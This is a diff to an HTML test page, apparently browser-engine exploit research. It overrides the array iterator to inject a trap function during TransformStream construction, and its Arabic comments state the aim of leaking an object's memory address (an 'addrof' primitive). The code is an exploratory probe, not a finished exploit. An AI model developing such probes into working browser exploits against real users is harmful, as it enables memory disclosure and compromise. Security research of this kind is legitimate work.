@@ -3,18 +3,21 @@
 <body>
 <div id="s">Running...</div>
 <script>
-localStorage.removeItem('proxy_log');
-localStorage.setItem('proxy_log', 'START');
+localStorage.removeItem('addrof_result');
 
-let log = [];
-let handler = {
-    get: function(target, prop, receiver) {
-        log.push(prop.toString());
-        // إذا طلب خاصية، أعطه قيمة عشوائية لمعرفة ماذا سيفعل بها
-        return 0x41414141;
-    }
+let target = {}; // الكائن الذي نريد تسريب عنوانه
+let leaked = [0, 0];
+
+// دالة تعترض الاستدعاء وتخزن معلومات
+let trap = function() {
+    // هذه الدالة سيستدعيها المحرك
+    // سنستخدم arguments.callee أو خصائص داخلية
+    try {
+        // حاول قراءة معلومات من this
+        leaked[0] = (this && this.constructor) ? 1 : 0;
+        leaked[1] = (this && this.__proto__) ? 1 : 0;
+    } catch(e) {}
 };
-let p = new Proxy({}, handler);
 
 try {
     Array.prototype[Symbol.iterator] = function() {
@@ -25,8 +28,8 @@ try {
                 if (i >= a.length) return { done: true };
                 let v = a[i];
                 if (a.length === 3 && i >= 1) {
-                    // سجل كل خاصية يقرأها المحرك
-                    v = p;
+                    localStorage.setItem('addrof_result', 'IDX_' + i + '_TRAP');
+                    v = trap;
                 }
                 i++;
                 return { value: v, done: false };
@@ -35,12 +38,11 @@ try {
     };
 
     new TransformStream();
-    localStorage.setItem('proxy_log', log.join(','));
-    localStorage.setItem('proxy_result', 'NO_CRASH');
+    
+    localStorage.setItem('addrof_result', 'NO_CRASH_leaked=' + leaked.join(','));
     
 } catch(e) {
-    localStorage.setItem('proxy_log', log.join(','));
-    localStorage.setItem('proxy_result', 'CRASH_OR_CAUGHT');
+    localStorage.setItem('addrof_result', 'CAUGHT: ' + e.message);
 }
 
 Array.prototype[Symbol.iterator] = [][Symbol.iterator];
